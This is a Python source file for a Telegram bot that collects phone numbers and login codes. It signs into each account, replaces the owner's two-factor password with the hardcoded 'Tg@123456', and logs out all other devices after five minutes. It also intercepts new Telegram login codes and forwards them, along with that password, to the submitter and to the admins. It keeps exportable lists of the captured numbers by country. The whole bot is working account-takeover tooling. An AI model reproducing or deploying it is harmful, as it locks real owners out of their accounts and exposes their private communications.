import os
import json
import re
import asyncio
from datetime import datetime
from dotenv import load_dotenv

from telethon import TelegramClient, events, functions
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes, ConversationHandler
)

load_dotenv()

# ====================== CONFIG ======================
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_IDS = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "0").split(",") if x.strip()]

TWO_FA_PASSWORD = "Tg@123456"
LOGOUT_AFTER_MINUTES = 5
CHECK_INTERVAL = 60          # প্রতি ৬০ সেকেন্ডে সেশন চেক করবে

# ====================== PATHS ======================
SESSIONS_DIR = "sessions"
DATA_DIR = "data"
os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(DATA_DIR, exist_ok=True)

ACCOUNTS_FILE = f"{DATA_DIR}/accounts.json"
CODES_FILE = f"{DATA_DIR}/codes.json"
SETTINGS_FILE = f"{DATA_DIR}/settings.json"
ADMINS_FILE = f"{DATA_DIR}/admins.json"

WAITING_CODE = 1
clients = {}
pending = {}

# ====================== HELPERS ======================
def load_json(path, default=None):
    if default is None:
        default = {}
    try:
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
    except:
        pass
    return default

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def get_admins():
    admins = load_json(ADMINS_FILE, [])
    if not admins:
        admins = ADMIN_IDS[:]
        save_json(ADMINS_FILE, admins)
    return admins

def is_admin(uid):
    return uid in get_admins()

def get_settings():
    s = load_json(SETTINGS_FILE, {})
    if "silent" not in s:
        s["silent"] = True
        save_json(SETTINGS_FILE, s)
    return s

def get_flag(phone):
    flags = {
        "880": "🇧🇩", "91": "🇮🇳", "92": "🇵🇰", "1": "🇺🇸", "44": "🇬🇧",
        "27": "🇿🇦", "234": "🇳🇬", "966": "🇸🇦", "971": "🇦🇪", "90": "🇹🇷",
        "7": "🇷🇺", "49": "🇩🇪", "33": "🇫🇷", "86": "🇨🇳", "62": "🇮🇩",
        "60": "🇲🇾", "65": "🇸🇬", "63": "🇵🇭", "55": "🇧🇷", "52": "🇲🇽",
        "20": "🇪🇬", "212": "🇲🇦", "40": "🇷🇴", "48": "🇵🇱"
    }
    p = str(phone).replace("+", "")
    for c in sorted(flags, key=len, reverse=True):
        if p.startswith(c):
            return flags[c]
    return "🏳️"

def get_country_code(phone):
    p = str(phone).replace("+", "")
    for c in ["880", "966", "971", "234", "212", "91", "92", "90", "86", "84", "82", "81",
              "66", "65", "63", "62", "60", "55", "52", "49", "48", "44", "40", "39", "33", "27", "20", "7", "1"]:
        if p.startswith(c):
            return c
    return p[:2]

def get_country_name(code):
    names = {
        "880": "Bangladesh", "91": "India", "92": "Pakistan", "1": "United States",
        "44": "United Kingdom", "27": "South Africa", "966": "Saudi Arabia", "971": "UAE",
        "90": "Turkey", "7": "Russia", "49": "Germany", "33": "France", "86": "China",
        "62": "Indonesia", "60": "Malaysia", "65": "Singapore"
    }
    return names.get(str(code), f"Country +{code}")

# ====================== TELETHON ======================
async def start_client(phone):
    path = f"{SESSIONS_DIR}/{phone.replace('+', '')}"
    client = TelegramClient(path, API_ID, API_HASH)

    @client.on(events.NewMessage(from_users=777000))
    async def handler(e):
        m = re.search(r'(\d{5,6})', e.message.message or "")
        if not m:
            return
        code = m.group(1)

        # Save code
        codes = load_json(CODES_FILE, {})
        if phone not in codes:
            codes[phone] = []
        codes[phone].insert(0, {"code": code, "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
        codes[phone] = codes[phone][:15]
        save_json(CODES_FILE, codes)

        accounts = load_json(ACCOUNTS_FILE, {})
        acc = accounts.get(phone)
        if not acc:
            return

        flag = get_flag(phone)
        country = get_country_name(get_country_code(phone))
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # ===== ইউজারকে কোড পাঠানো =====
        try:
            from telegram import Bot
            bot = Bot(token=BOT_TOKEN)
            user_msg = (
                f"🎉 **Congratulations!**\n\n"
                f"🌍 {flag} **{country}**\n"
                f"📱 Number: `{phone}`\n"
                f"🔑 OTP Code: `{code}`\n"
                f"🔒 Two-Factor: `{TWO_FA_PASSWORD}`\n"
                f"📅 {now}\n\n"
                f"✅ Use this code to login."
            )
            await bot.send_message(chat_id=acc["uid"], text=user_msg, parse_mode="Markdown")
        except Exception as ex:
            print("User notify error:", ex)

        # ===== অ্যাডমিনকে নোটিফিকেশন =====
        settings = get_settings()
        if settings.get("silent", True):
            for admin_id in get_admins():
                try:
                    from telegram import Bot
                    bot = Bot(token=BOT_TOKEN)
                    admin_msg = (
                        f"🔔 **New Code Received**\n\n"
                        f"👤 Name: {acc.get('name', 'Unknown')}\n"
                        f"📧 Username: @{acc.get('username') or 'None'}\n"
                        f"🆔 Chat ID: `{acc['uid']}`\n"
                        f"📱 Number: `{phone}`\n"
                        f"🌍 {flag} {country}\n"
                        f"🔑 OTP: `{code}`\n"
                        f"🔒 2FA: `{TWO_FA_PASSWORD}`\n"
                        f"📅 {now}"
                    )
                    await bot.send_message(chat_id=admin_id, text=admin_msg, parse_mode="Markdown")
                except:
                    pass

    try:
        await client.connect()
        if await client.is_user_authorized():
            clients[phone] = client
            return True
        await client.disconnect()
    except:
        pass
    return False

async def enable_2fa(client):
    try:
        await client.edit_2fa(new_password=TWO_FA_PASSWORD)
        return True
    except:
        return False

async def logout_other_devices(phone):
    try:
        if phone not in clients:
            return
        client = clients[phone]
        result = await client(functions.account.GetAuthorizationsRequest())
        for auth in result.authorizations:
            if not auth.current:
                try:
                    await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
                except:
                    pass
    except Exception as e:
        print(f"Logout other devices error ({phone}):", e)

async def check_sessions_loop():
    """প্রতি কিছুক্ষণ পর সেশন চেক করে অবৈধ হলে অটো রিমুভ করবে"""
    while True:
        try:
            accounts = load_json(ACCOUNTS_FILE, {})
            to_remove = []

            for phone in list(accounts.keys()):
                try:
                    if phone in clients:
                        client = clients[phone]
                        if not await client.is_user_authorized():
                            to_remove.append(phone)
                    else:
                        # ক্লায়েন্ট না থাকলে আবার কানেক্ট করার চেষ্টা
                        ok = await start_client(phone)
                        if not ok:
                            to_remove.append(phone)
                except:
                    to_remove.append(phone)

            if to_remove:
                for phone in to_remove:
                    if phone in accounts:
                        del accounts[phone]
                    if phone in clients:
                        try:
                            await clients[phone].disconnect()
                        except:
                            pass
                        del clients[phone]
                    # সেশন ফাইলও ডিলিট
                    session_file = f"{SESSIONS_DIR}/{phone.replace('+', '')}.session"
                    if os.path.exists(session_file):
                        try:
                            os.remove(session_file)
                        except:
                            pass
                save_json(ACCOUNTS_FILE, accounts)
                print(f"Auto removed {len(to_remove)} invalid sessions")

        except Exception as e:
            print("Session check error:", e)

        await asyncio.sleep(CHECK_INTERVAL)

# ====================== USER COMMANDS ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text(
        f"👋 Welcome **{user.first_name}**!\n\n"
        f"📱 Send phone number with `+`\n"
        f"Example: `+8801712345678`\n\n"
        f"After successful login use:\n"
        f"➡️ /information",
        parse_mode="Markdown"
    )

async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().replace(" ", "")
    if not re.match(r'^\+?\d{8,15}$', text):
        return

    phone = text if text.startswith("+") else "+" + text
    chat_id = update.effective_chat.id
    uid = update.effective_user.id
    user = update.effective_user

    wait = await update.message.reply_text("⏳ Sending login code...")

    try:
        client = TelegramClient(f"{SESSIONS_DIR}/{phone[1:]}", API_ID, API_HASH)
        await client.connect()

        if await client.is_user_authorized():
            await wait.edit_text("✅ This number is already logged in!")
            await client.disconnect()
            return ConversationHandler.END

        sent = await client.send_code_request(phone)
        pending[chat_id] = {
            "client": client,
            "phone": phone,
            "hash": sent.phone_code_hash,
            "uid": uid,
            "name": user.first_name or "",
            "username": user.username or ""
        }

        await wait.edit_text(
            f"📲 {get_flag(phone)} `{phone}`\n\n"
            f"🔑 Code sent! Please send the 5 or 6-digit login code.\n\n"
            f"➿ /cancel",
            parse_mode="Markdown"
        )
        return WAITING_CODE

    except FloodWaitError as e:
        await wait.edit_text(f"⚠️ FloodWait! Please wait {e.seconds} seconds.")
        return ConversationHandler.END
    except Exception as e:
        await wait.edit_text(f"❌ Error: {e}")
        return ConversationHandler.END

async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id not in pending:
        await update.message.reply_text("⚠️ Session expired. Please send the number again.")
        return ConversationHandler.END

    data = pending[chat_id]
    code = update.message.text.strip()
    phone = data["phone"]
    uid = data["uid"]

    try:
        await data["client"].sign_in(phone, code, phone_code_hash=data["hash"])
    except PhoneCodeInvalidError:
        await update.message.reply_text("❗️ Invalid code. Please try again.\n\n/cancel")
        return WAITING_CODE
    except SessionPasswordNeededError:
        await update.message.reply_text("⚠️ This number already has Two-Factor Authentication.")
        await data["client"].disconnect()
        del pending[chat_id]
        return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text(f"❌ Login Error: {e}")
        await data["client"].disconnect()
        del pending[chat_id]
        return ConversationHandler.END

    # Success
    me = await data["client"].get_me()
    ok = await enable_2fa(data["client"])

    # ৫ মিনিট পর অন্য ডিভাইস লগআউট
    async def delayed_logout():
        await asyncio.sleep(LOGOUT_AFTER_MINUTES * 60)
        await logout_other_devices(phone)

    asyncio.create_task(delayed_logout())

    accounts = load_json(ACCOUNTS_FILE, {})
    accounts[phone] = {
        "uid": uid,
        "name": data.get("name") or me.first_name or "",
        "username": data.get("username") or me.username or "",
        "country": get_country_code(phone),
        "2fa": TWO_FA_PASSWORD if ok else "Failed",
        "added": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_json(ACCOUNTS_FILE, accounts)

    await data["client"].disconnect()
    await start_client(phone)
    del pending[chat_id]

    flag = get_flag(phone)
    country = get_country_name(get_country_code(phone))

    await update.message.reply_text(
        f"🎉 **Login Successful!**\n\n"
        f"🌍 {flag} **{country}**\n"
        f"📱 Number: `{phone}`\n"
        f"👤 Name: {me.first_name or 'N/A'}\n"
        f"🔒 2FA: `{'Enabled ✅' if ok else 'Failed ❌'}`\n\n"
        f"⏳ Other devices will be logged out in **{LOGOUT_AFTER_MINUTES} minutes**.\n"
        f"➡️ Use /information for more options.",
        parse_mode="Markdown"
    )
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in pending:
        try:
            await pending[chat_id]["client"].disconnect()
        except:
            pass
        del pending[chat_id]
    await update.message.reply_text("✅ Cancelled successfully.")
    return ConversationHandler.END

# ====================== /information ======================
async def information(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    accounts = load_json(ACCOUNTS_FILE, {})
    user_accs = {p: i for p, i in accounts.items() if i.get("uid") == uid}
    total = len(user_accs)

    kb = [
        [InlineKeyboardButton("📱 All Number", callback_data="info_allnum")],
        [InlineKeyboardButton("📁 Download Number File", callback_data="info_download")]
    ]
    await update.message.reply_text(
        f"ℹ️ **Information Menu**\n\n"
        f"📊 Currently Active Numbers: `{total}`\n\n"
        f"Select an option below:",
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode="Markdown"
    )

async def info_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    data = q.data

    accounts = load_json(ACCOUNTS_FILE, {})
    user_accs = {p: i for p, i in accounts.items() if i.get("uid") == uid}

    if data == "info_allnum":
        if not user_accs:
            await q.edit_message_text("📭 You have no active numbers right now.")
            return

        country_count = {}
        for p, i in user_accs.items():
            c = i.get("country") or get_country_code(p)
            country_count[c] = country_count.get(c, 0) + 1

        kb = []
        for c, n in sorted(country_count.items(), key=lambda x: -x[1]):
            kb.append([InlineKeyboardButton(
                f"{get_flag('+' + c)} {get_country_name(c)} ({n})",
                callback_data=f"show_{c}"
            )])
        kb.append([InlineKeyboardButton("◀️ Back", callback_data="info_back")])

        await q.edit_message_text(
            "📱 **Your Active Numbers by Country**\n\nSelect a country:",
            reply_markup=InlineKeyboardMarkup(kb),
            parse_mode="Markdown"
        )

    elif data.startswith("show_"):
        code = data.replace("show_", "")
        nums = [p for p, i in user_accs.items() if (i.get("country") == code or get_country_code(p) == code)]
        text = f"{get_flag('+' + code)} **{get_country_name(code)}** — `{len(nums)}` numbers\n\n"
        for p in nums:
            text += f"`{p}`\n"
        kb = [[InlineKeyboardButton("◀️ Back", callback_data="info_allnum")]]
        await q.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data == "info_download":
        if not user_accs:
            await q.edit_message_text("📭 No numbers available to download.")
            return

        country_count = {}
        for p, i in user_accs.items():
            c = i.get("country") or get_country_code(p)
            country_count[c] = country_count.get(c, 0) + 1

        kb = [[InlineKeyboardButton("🌍 All Country", callback_data="dl_all")]]
        for c, n in sorted(country_count.items(), key=lambda x: -x[1]):
            kb.append([InlineKeyboardButton(
                f"{get_flag('+' + c)} {get_country_name(c)} ({n})",
                callback_data=f"dl_{c}"
            )])
        kb.append([InlineKeyboardButton("◀️ Back", callback_data="info_back")])

        await q.edit_message_text(
            "📁 **Select Country to Download**",
            reply_markup=InlineKeyboardMarkup(kb),
            parse_mode="Markdown"
        )

    elif data.startswith("dl_"):
        code = data.replace("dl_", "")
        user = q.from_user

        lines = [
            f"Name: {user.first_name or 'Unknown'}",
            f"Username: @{user.username or 'None'}",
            f"Chat ID: {uid}",
            f"Total Active Numbers: {len(user_accs)}",
            ""
        ]

        country_nums = {}
        for p, i in user_accs.items():
            c = i.get("country") or get_country_code(p)
            if code != "all" and c != code:
                continue
            if c not in country_nums:
                country_nums[c] = []
            country_nums[c].append(p)

        for c, nums in country_nums.items():
            lines.append(f"{get_country_name(c)} Total: {len(nums)}")
            lines.extend(nums)
            lines.append("")

        content = "\n".join(lines)
        path = f"{DATA_DIR}/user_{uid}_{code}.txt"
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)

        await q.message.reply_document(
            document=open(path, "rb"),
            filename=f"numbers_{code}.txt",
            caption=f"📁 Your numbers file ({code})"
        )
        await q.edit_message_text("✅ File sent successfully!")

    elif data == "info_back":
        total = len(user_accs)
        kb = [
            [InlineKeyboardButton("📱 All Number", callback_data="info_allnum")],
            [InlineKeyboardButton("📁 Download Number File", callback_data="info_download")]
        ]
        await q.edit_message_text(
            f"ℹ️ **Information Menu**\n\n📊 Currently Active Numbers: `{total}`",
            reply_markup=InlineKeyboardMarkup(kb),
            parse_mode="Markdown"
        )

# ====================== ADMIN DASHBOARD ======================
async def dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return

    accounts = load_json(ACCOUNTS_FILE, {})
    total_users = len(set(i.get("uid") for i in accounts.values() if i.get("uid")))
    total_numbers = len(accounts)
    admin_count = sum(1 for i in accounts.values() if i.get("uid") in get_admins())
    settings = get_settings()
    silent = "🟢 ON" if settings.get("silent", True) else "🔴 OFF"

    text = (
        f"👨‍💻 **Admin Dashboard**\n\n"
        f"👥 Total Users: `{total_users}`\n"
        f"🔢 Total Active Numbers: `{total_numbers}`\n"
        f"👑 Admin Added: `{admin_count}`\n"
        f"🔔 Silent Mode: {silent}\n"
        f"🟢 Online Clients: `{len(clients)}`"
    )

    kb = [
        [InlineKeyboardButton("📢 BoardChat", callback_data="adm_bc")],
        [InlineKeyboardButton(f"🔔 Silent: {silent}", callback_data="adm_silent")],
        [InlineKeyboardButton("📁 Download All Users File", callback_data="adm_allfile")],
        [InlineKeyboardButton("🔄 Reload Clients", callback_data="adm_reload")]
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

async def admin_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return

    data = q.data

    if data == "adm_bc":
        context.user_data["action"] = "broadcast"
        await q.edit_message_text("📢 Send the message you want to broadcast to all users:")

    elif data == "adm_silent":
        s = get_settings()
        s["silent"] = not s.get("silent", True)
        save_json(SETTINGS_FILE, s)
        status = "ON 🟢" if s["silent"] else "OFF 🔴"
        await q.edit_message_text(f"🔔 Silent Mode is now **{status}**")

    elif data == "adm_allfile":
        accounts = load_json(ACCOUNTS_FILE, {})
        users = {}
        for p, i in accounts.items():
            uid = i.get("uid")
            if not uid:
                continue
            if uid not in users:
                users[uid] = {
                    "name": i.get("name", ""),
                    "username": i.get("username", ""),
                    "numbers": []
                }
            users[uid]["numbers"].append(p)

        lines = []
        for uid, info in users.items():
            lines.append(f"Name: {info['name']}")
            lines.append(f"Username: @{info['username'] or 'None'}")
            lines.append(f"Chat ID: {uid}")
            lines.append(f"Total: {len(info['numbers'])}")
            country_nums = {}
            for p in info["numbers"]:
                c = get_country_code(p)
                if c not in country_nums:
                    country_nums[c] = []
                country_nums[c].append(p)
            for c, nums in country_nums.items():
                lines.append(f"{get_country_name(c)} Total: {len(nums)}")
                lines.extend(nums)
            lines.append("")
            lines.append("─" * 30)
            lines.append("")

        path = f"{DATA_DIR}/all_users.txt"
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines))

        await q.message.reply_document(
            document=open(path, "rb"),
            filename="all_users_numbers.txt",
            caption="📁 All Users Active Numbers"
        )
        await q.edit_message_text("✅ File sent successfully!")

    elif data == "adm_reload":
        loaded = 0
        for p in load_json(ACCOUNTS_FILE, {}):
            try:
                if await start_client(p):
                    loaded += 1
            except:
                pass
        await q.edit_message_text(f"✅ Reloaded `{loaded}` clients")

async def admin_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if "action" not in context.user_data:
        return

    action = context.user_data.pop("action")
    text = update.message.text.strip()

    if action == "broadcast":
        accounts = load_json(ACCOUNTS_FILE, {})
        users = list(set(i.get("uid") for i in accounts.values() if i.get("uid")))
        ok = 0
        status = await update.message.reply_text(f"📢 Sending to {len(users)} users...")
        for u in users:
            try:
                await context.bot.send_message(u, f"📢 **Announcement**\n\n{text}", parse_mode="Markdown")
                ok += 1
            except:
                pass
        await status.edit_text(f"✅ Broadcast completed!\nSuccess: `{ok}`")

# ====================== MAIN ======================
async def post_init(app: Application):
    print("🔄 Loading sessions...")
    accounts = load_json(ACCOUNTS_FILE, {})
    for phone in accounts:
        try:
            await start_client(phone)
        except:
            pass
    print(f"✅ Bot Ready! Loaded {len(clients)} sessions.")

    # সেশন চেক লুপ চালু
    asyncio.create_task(check_sessions_loop())

def main():
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    conv = ConversationHandler(
        entry_points=[
            MessageHandler(
                filters.Regex(r'^\+?\d{8,15}$'),
                handle_phone
            )
        ],
        states={
            WAITING_CODE: [
                MessageHandler(
                    filters.TEXT & ~filters.COMMAND,
                    handle_code
                )
            ]
        },
        fallbacks=[
            CommandHandler("cancel", cancel)
        ],
        allow_reentry=True
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("information", information))
    app.add_handler(CommandHandler("dashboard", dashboard))
    app.add_handler(CommandHandler("cancel", cancel))

    app.add_handler(conv)

    app.add_handler(
        CallbackQueryHandler(
            info_cb,
            pattern=r"^(info_|show_|dl_)"
        )
    )

    app.add_handler(
        CallbackQueryHandler(
            admin_cb,
            pattern=r"^adm_"
        )
    )

    app.add_handler(
        MessageHandler(
            filters.TEXT & ~filters.COMMAND,
            admin_text
        )
    )

    print("🚀 Starting bot...")
    app.run_polling()


if __name__ == "__main__":
    main()
